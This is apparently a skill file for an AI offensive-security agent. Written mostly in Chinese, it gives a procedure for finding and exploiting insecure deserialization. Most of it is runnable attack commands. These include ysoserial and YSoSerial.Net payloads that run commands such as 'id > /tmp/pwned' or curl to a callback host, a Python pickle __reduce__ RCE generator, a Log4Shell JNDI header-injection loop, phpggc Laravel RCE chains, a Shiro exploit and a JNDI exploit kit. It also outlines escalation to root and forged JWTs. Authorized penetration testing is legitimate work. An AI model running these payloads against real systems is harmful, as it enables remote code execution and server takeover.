---
name: hunt-deserialization
description: 挖掘不安全反序列化——Java gadget 链（ysoserial）、PHP 对象注入（phpggc）、Python pickle RCE、.NET BinaryFormatter、Ruby Marshal.load、JNDI/Log4Shell。通过反序列化实现 RCE 几乎总是严重级别。当目标运行 Java、PHP 序列化、Python pickle、.NET 或 Ruby on Rails 时使用。
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
metadata:
  tags: [deserialization, hunt, redteam]
  category: redteam
---

# HUNT-DESERIALIZATION —— 不安全反序列化

## When to Use

- 目标运行 Java、PHP 序列化、Python pickle、.NET。
- Ruby on Rails。

## Prerequisites

- 针对目标的明确授权、目标边界与速率限制。
- 工具：`curl`、`interactsh-client`、`phpggc`、`python3`、`ysoserial`。
- 可写的证据目录：`export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`。
- 对于任何改变状态的步骤（写入、上传、凭据尝试），在执行命令前立即获得明确确认。

## How to Run

```bash
# Set once per engagement; every step below uses these.
TARGET="example.com"   # or the engagement target
export OUTPUT_DIR="${OUTPUT_DIR:-./output}"

# Java serialized objects start with AC ED 00 05 (hex) or rO0A (base64)
echo "rO0ABXQ=" | base64 -d | xxd | head -1  # shows: ac ed 00 05

# PHP serialization: O:8:"stdClass":0:{}
# Python pickle: starts with \x80\x04 (protocol 4) or \x80\x02

# Apache Shiro: rememberMe cookie present
curl --max-time 30 --connect-timeout 10 -sI https://$TARGET/ | grep -i "Set-Cookie.*rememberMe"

# Log4j: test user-controlled fields for JNDI interpolation
curl --max-time 30 --connect-timeout 10 -H 'User-Agent: ${jndi:dns://COLLAB_HOST/a}' https://$TARGET/
```

## Procedure

以下各阶段即为操作流程。保持每次探测有界（`--max-time`），将证据记录在 `OUTPUT_DIR` 下，并在遇到陷阱中列出的停止条件时停止。

## 最高价值目标

反序列化漏洞几乎总是严重级别——它们无需前置条件即可直接导致 RCE。

**最高价值的利用链：**
- **Java ysoserial gadget 链** —— CommonsCollections、Spring、JNDI、Groovy gadget → 完整的 OS 命令执行
- **PHP 对象注入** —— `__wakeup` / `__destruct` 魔术方法 → 文件写入 / RCE
- **Python pickle** —— `pickle.loads(attacker_data)` → `__reduce__` → `os.system('id')`
- **.NET BinaryFormatter** —— TypeConfuseDelegate gadget 链 → RCE
- **Ruby Marshal.load** —— Gem::Requirement、Gem::Installer gadget → RCE
- **JNDI 注入** —— Log4Shell 模式：`${jndi:ldap://attacker/a}` → 类加载 → RCE

---

## 攻击面信号

### 检测模式
```bash
# Java serialized objects start with AC ED 00 05 (hex) or rO0A (base64)
echo "rO0ABXQ=" | base64 -d | xxd | head -1  # shows: ac ed 00 05

# PHP serialization: O:8:"stdClass":0:{}
# Python pickle: starts with \x80\x04 (protocol 4) or \x80\x02

# Apache Shiro: rememberMe cookie present
curl --max-time 30 --connect-timeout 10 -sI https://$TARGET/ | grep -i "Set-Cookie.*rememberMe"

# Log4j: test user-controlled fields for JNDI interpolation
curl --max-time 30 --connect-timeout 10 -H 'User-Agent: ${jndi:dns://COLLAB_HOST/a}' https://$TARGET/
```

### 头部 / Cookie 信号
```
Content-Type: application/x-java-serialized-object
Cookie containing rO0= prefix (Java base64 serialized)
Cookie: rememberMe= (Apache Shiro)
Cookie: _VIEWSTATE (ASP.NET ViewState without encryption)
Endpoints: /remoting/, /invoker/, /jmx-console/, /wls-wsat/
```

---

## 逐步挖掘方法论

### 阶段 1 —— Java 反序列化（ysoserial）
```bash
# Install ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Generate OOB detection payload
java -jar ysoserial-all.jar CommonsCollections6 \
  'curl http://COLLAB_HOST/ysoserial' | base64 -w0

# Send as body or cookie
java -jar ysoserial-all.jar CommonsCollections6 'id > /tmp/pwned' | base64 | \
  curl --max-time 30 --connect-timeout 10 -s https://$TARGET/wls-wsat/CoordinatorPortType \
    -H "Content-Type: application/x-java-serialized-object" \
    --data-binary @-

# Apache Shiro exploit (default AES key)
python3 shiro_exploit.py -u https://$TARGET/ -c "id"
```

### 阶段 2 —— PHP 对象注入
```bash
# Find unserialize() calls in source
grep -r "unserialize(" --include="*.php" .

# Inject test: O:8:"stdClass":1:{s:4:"test";s:5:"value";}
# Send in cookie, POST param, or hidden form field
# If error changes → deserialization confirmed

# Craft gadget chain using phpggc
git clone https://github.com/ambionics/phpggc
php phpggc -l  # list chains
php phpggc Laravel/RCE5 system id | base64
```

### 阶段 3 —— Python Pickle
```bash
# Generate OOB payload
python3 -c "
import pickle, os, base64
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://COLLAB_HOST/pickle-rce',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
"

# Send as cookie or POST body
curl --max-time 30 --connect-timeout 10 -s https://$TARGET/api/load-model \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.pkl
```

### 阶段 4 —— .NET ViewState
```bash
# Check if ViewState is unsigned (MAC disabled)
# Look for __VIEWSTATE in HTML source without __VIEWSTATEMAC

# YSoSerial.Net
dotnet YSoSerial.exe -f BinaryFormatter -g TypeConfuseDelegate \
  -c "cmd /c curl http://COLLAB_HOST/viewstate-rce" -o base64
```

### 阶段 5 —— Log4Shell / JNDI
```bash
# Test all user-controlled inputs
COLLAB="COLLAB_HOST"
for HEADER in "User-Agent" "X-Forwarded-For" "Referer" "X-Api-Version" "Accept-Language"; do
  curl --max-time 30 --connect-timeout 10 -s https://$TARGET/ -H "$HEADER: \${jndi:dns://$COLLAB/$HEADER}" &
done

# Test POST body fields
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"\${jndi:ldap://$COLLAB/a}\"}"
```

### 阶段 6 —— Ruby Marshal
```bash
# Look for Marshal.load in source
grep -r "Marshal.load\|Marshal.restore" --include="*.rb" .

# Gem::Requirement gadget chain via marshalable objects
# Use ruby-advisory-db gadgets
```

---

## 利用链表

| 反序列化信号 | 可串联至 | 影响 |
|-----------------------|----------|--------|
| 任意反序列化 RCE | /etc/passwd + id 输出 | 证明任意命令执行 |
| 以低权限用户身份实现 RCE | 查找 SUID 二进制 / sudo 规则 | 提权 → root |
| 盲 RCE（OOB 回调） | DNS 回调 → 确认执行 | 足以作为严重 PoC |
| Log4Shell | LDAP → JNDI → 类加载 | JVM 进程上的完整 RCE |

---

## 自动化
```bash
# OOB listener
interactsh-client -v -n 5

# JNDI exploit kit
git clone https://github.com/pimps/JNDI-Exploit-Kit
```

---

## 校验

✅ 来自 COLLAB 主机的 DNS/HTTP 回调：确认盲反序列化
✅ 响应中出现命令输出：确认完整 RCE

**严重性：** 几乎总是 **严重**——以服务器进程权限实现 RCE。

## Pitfalls

- **只有 ysoserial payload 而无 gadget 链** —— 生成 payload 并不等于利用成功。需要确认目标 classpath 中确实存在该特定 gadget。
- **Java 反序列化与 PHP unserialize** —— 语言不同、工具不同。不要跨语言套用 payload。
- **payload 用 base64 编码但服务器期望原始二进制** —— 有些服务器接受 base64，有些接受原始数据。两种编码都要测试。
- **Content-Type 不匹配** —— Java 反序列化通常期望 `application/x-java-serialized-object` 或 `application/octet-stream`。错误的 Content-Type 可能导致静默拒绝。
- **WAF 对反序列化的过滤** —— 许多 WAF 会拦截已知的 ysoserial gadget 特征。漏洞可能仍然存在，但需要自定义 gadget 链。

---

## Verification

1. **ysoserial 可用性** —— 检查是否安装了 ysoserial：
   ```bash
   which ysoserial 2>/dev/null || ls /opt/ysoserial*.jar 2>/dev/null | head -1 && echo "PASS: ysoserial found" || echo "NOTE: ysoserial not installed"
   ```
2. **PHP 反序列化测试** —— 验证 PHP payload 生成：
   ```bash
   php -r "echo serialize(['test'=>'value']);" 2>/dev/null && echo "PASS: PHP serialize works" || echo "NOTE: PHP not available"
   ```
所有测试均用于验证反序列化探测。

---

## 相关技能

- **`hunt-rce`** —— 反序列化是服务端 RCE 的典型路径。利用原语：Java ysoserial gadget 链（CommonsCollections6）→ 以应用服务器用户身份执行 OS 命令 → 响应中出现 `id` / `whoami`，或收到 OOB 回调。
- **`hunt-aspnet`** —— ASP.NET ViewState 反序列化是 .NET 特有的 RCE 类别。利用原语：`__VIEWSTATEENCRYPTED=""`（仅签名）+ 泄露的 `<machineKey>` validationKey → `ysoserial.net -p ViewState -g TypeConfuseDelegate` → 以 IIS 工作进程身份实现 RCE。
- **`hunt-lfi`** —— PHP 的 `phar://` 反序列化可将文件上传与 PHP 对象注入结合。利用原语：上传一个多语种 JPEG + PHAR 文件 → 通过 `phar:///path/to/upload.jpg` 包含它 → `__wakeup`/`__destruct` 魔术方法被调用 → 通过 PHP gadget 链实现 RCE。
- **`hunt-xxe`** —— XML 外部实体处理常与 XML 反序列化 sink 并存。利用原语：SOAP 端点接受 XML → XXE 通过 OOB DTD 外泄 `/etc/passwd` → 若 XML 解析器使用 XStream 或类似组件，则可与 Java 反序列化结合。
- **`hunt-api-misconfig`** —— JWT 的 `alg:none` 或弱 HMAC 密钥属于“反序列化等价”问题——服务器在未校验完整性的情况下反序列化 token payload。利用原语：`{"alg":"none","typ":"JWT"}.{"sub":"admin","role":"admin"}.` → 服务器将伪造的 JWT payload 作为反序列化身份接受。
- **`security-arsenal`** —— 可调用反序列化 payload 树：ysoserial 的 Java gadget 链（CommonsCollections、Spring、JNDI、Groovy、ROME）、ysoserial.net（.NET BinaryFormatter、ViewState、ObjectStateFormatter）、PHPGGC（Laravel、CodeIgniter、Zend）、Python pickle 的 `__reduce__`、Ruby Marshal 的 `Gem::Installer`，以及 JNDI/Log4Shell 链。
- **`triage-validation`** —— 在声称严重级别前先应用 Pre-Severity Gate。cookie 中出现 Java 序列化对象头（`AC ED 00 05` / `rO0ABX`）并**不**确认应用会反序列化它——需发送带 OOB 回调的构造 ysoserial payload 来确认。发现反序列化 = 严重，但*确认*反序列化 = 更高的价值。
